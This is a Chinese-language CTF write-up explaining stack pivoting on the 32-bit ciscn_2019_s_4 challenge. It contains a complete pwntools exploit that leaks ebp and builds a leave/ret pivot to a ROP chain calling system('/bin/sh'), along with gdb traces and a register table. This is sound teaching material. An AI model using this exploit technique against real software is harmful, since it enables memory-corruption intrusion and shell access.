---
title: PWN之栈迁移详解
description: 本文深入浅出地讲解了栈迁移技术的原理、利用条件和完整的EXP编写过程。重点在于gdb调试以认真观察栈迁移的原理。
tags:
  - stack
  - pwn
---

## 一.栈迁移
例题下载地址:[ciscn_2019_s_4](https://buuoj.cn/challenges#ciscn_2019_s_4)

~~第一篇文章可能写得有点的仓促~~
## 1.前景导入
 一个栈题关键代码如下：
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Welcome, my friend. What's your name?");
  vul();
  return 0;
}
 ```
```c
int init()
{
  setvbuf(stdin, 0, 2, 0);
  return setvbuf(stdout, 0, 2, 0);
}
```

```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

```c
int hack()
{
  return system("echo flag");
}
```
检查保护：
```shell
 checksec ciscn_2019_s_4                                                                                                                   [*] '/home/today/main/ctf/pwn/buu/ciscn_2019_s_4'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
- 我们能发现溢出空间只有0x30-0x28-0x4=4字节，这四字节似乎也无法构造ROP链，该怎么办呢
## 2.必备知识-32为例
## 2.1 leave指令
[寄存器]即寄存器保存的地址上的数据，即此时寄存器是二级指针，[寄存器]`即**寄存器`，
`leave`等价于
```nasm
mov esp,ebp  ；把栈顶指针从栈顶移动到栈底
pop ebp
```
**注意了**:pop ebp等价于
```nasm
mov ebp, [esp]  ; 将当前栈顶的值（即调用者之前保存的 ebp）写入 ebp 寄存器
add esp, 4      ; 栈顶指针上移 4 字节，指向返回地址
```
### 2.2函数尾声
标准的函数尾声:
```nasm
leave 
ret  
```
### 2.3图解
![[Pasted image 20260518193107.png|leave的分步执行]]
`ret`图解
![[Pasted image 20260518193412.png|ret执行]]
## 3.栈迁移
### 3.1 原理
原理应该还得自己在gdb一步步看，实例exp（我用tmux):
```python
from pwn import *
context.binary = './ciscn_2019_s_4'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
p = process('./ciscn_2019_s_4')
#p = remote('node5.buuoj.cn',28336)

leave_ret = 0x08048562
system = 0x8048400

p.recv()
gdb.attach(p, gdbscript="""
set disassembly-flavor intel
set follow-fork-mode parent
b *0x80485fc
c
""")
#p.sendline(b'a'*0x27+b'B')
payload0 =b'a'*0x27+b'B'
p.send(payload0)
p.recvuntil('B')
ebp = u32(p.recv(4))
p.recv()

payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
p.sendline(payload)
p.interactive()
```
- 现在在vul函数的nop中下了断点，等发送了两次payload就会停在vul函数的nop中，nop指令后面是`leave`和`ret`，正常的执行流程是**leave后就让ebp回到main函数的栈帧**，但被我们把ebp覆盖成栈顶了，这样就把栈底覆盖到栈顶了。现在看实际的内存情况
### 3.2调试分析栈迁移：
![[Pasted image 20260518200149.png|leave之前]]
	现在程序执行了`NOP`,停在`leave`之前,我们发现，`ebp`处的值已经被我们覆盖为栈顶的地址了，*ebp+4的返回地址*被我们覆盖为`leave ,ret`指令,我们把**rop链**放到了栈顶上。接下来执行下一条汇编指令,`leave`:
![[Pasted image 20260518200623.png|leave后，ret前]]
	现在已经执行了`leave`,`ebp`被迁移到原来栈顶的位置，而`esp`移动到返回地址上，准备执行函数原来就有的`ret指令`，而返回地址上是`leave,ret`,我们执行下一条汇编指令：`ret`即`pop eip`
![[Pasted image 20260518201620.png|ret之后]]
	现在，我们的payload里面的`leave,ret`被填入eip寄存器，即将再次执行`leave `
，将会把`esp指针`放到`ebp`处，即`esp`又回到最开始的栈顶，以便执行我们的*rop链*，然后`ebp`指向0xaaaa
![[Pasted image 20260518201922.png|我们填充的leave执行前]]
	现在栈迁移完成了，然后还有一个`leave,ret`的指令里面的`ret`指令即将执行，使得`esp`指针抬高四字节，指向`system`,最终执行`system('bin/sh')`
![[Pasted image 20260518202131.png|成功执行system('bin/sh']]

### 3.3 ebp,eip,ebp寄存器在栈迁移过程中的变化
- 记住了：
发送payload前:`leave`指令后，`push ebp`让**ebp从vul函数栈帧的栈基址回到main函数的栈基址**
> 发送payload后

|寄存器|leave前|leave1(mov esp,ebp)|leave2(push ebp)|ret|leave(我们填充上去的)|
|-----|-----|-----|-----|------|-----
|esp|0xffb12520|0xffb12548|0xffb1254c|0xffb12550|0xffb12524|
|[esp] (即esp指向的地址的值)|0xaaaa|0xffb12520|被我们填充的leave|不重要|system
|ebp|0xffb12548|0xffb12548|0xffb12520|0xffb12520|(0xaaaa)不重要
|[ebp]同理|0xffb12520|0xffb12520|0xaaaa|0xaaaa|不重要|
|eip|leave1|push ebp|ret|leave|ret|
### 3.4总结原理:
- 第一个leave是让ebp迁移到原来的栈顶，但这个时候esp还没迁移过来，不好劫持程序流程
- 第二个leave是让esp迁移会原来的栈顶，方便执行`system('.bin/sh')`

**只要你能想明白3.3的表格，那么你就能想明白栈迁移到原理。**

	栈迁移原理大概就是这样，最好自己gdb调试看看
**学习心得**
> 我也是从栈迁移才开始**从程序执行流程来想**，用gdb来看，才明白程序的执行流程，感觉真的明白了pwn。*在这之前都是脚本小子，只会套模板构造payload*
## 4.复现
### 4.1 前置准备
- 获取,可用的gadget `leave ,ret`的指令地址,获取system的plt地址
```shell
 ROPgadget --binary ciscn_2019_s_4 |grep leave
 objdump -d ciscn_2019_s_4|grep system            
```
### 4.2先拿到有关的ebp的真实地址
- 因为我们要把`ebp`迁移到栈顶的话,就要拿到`ebp`的真实地址，而且经过调试分析：
![[Pasted image 20260519191203.png|栈帧]]
 **我们发现main函数的栈基址在vul的栈基址的0x10上面处**
 - 我们先通过覆盖到ebp处，把[ebp]即main函数的栈基址打印出来,现在用B来定位
 - payload0
 ```python
 payload0 =b'a'*0x27+b'B'
 ```
 这样就能拿到`main`的`ebp`了，而缓冲区起点则是`ebp-0x28`即`main_ebp-0x38`
 ### 4.3分析
 有`system函数`但没`/bin/sh`字符串。那我们计算，第二次leave后，即mov esp,ebp,push ebp.
 - `mov esp,ebp`,此时`esp`回到缓冲区起点，即`esp= main_ebp-0x38`,
 - `push ebp`,此时`esp= esp+4`,即`esp = main_ebp - 0x34`
 - 而`esp`指向的 `main_ebp - 0x34`处要放`system_plt`调用`system`函数
 - 为了对齐，`system`后的内存单元`main_ebp - 0x30` 还要放`0`
 - 所以`main_ebp - 0x2c`处放填`/bin/sh`的位置作为`system`的参数
 - 所以`main_ebp - 0x28`处填入`/bin/sh`是最方便的，也方便计算。
 - 再把`leave , ret`填入payload中
 所以得到`payload`,
 ```python
 payload = payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
 ```
 ### 4.4 总的exp前面已经给过了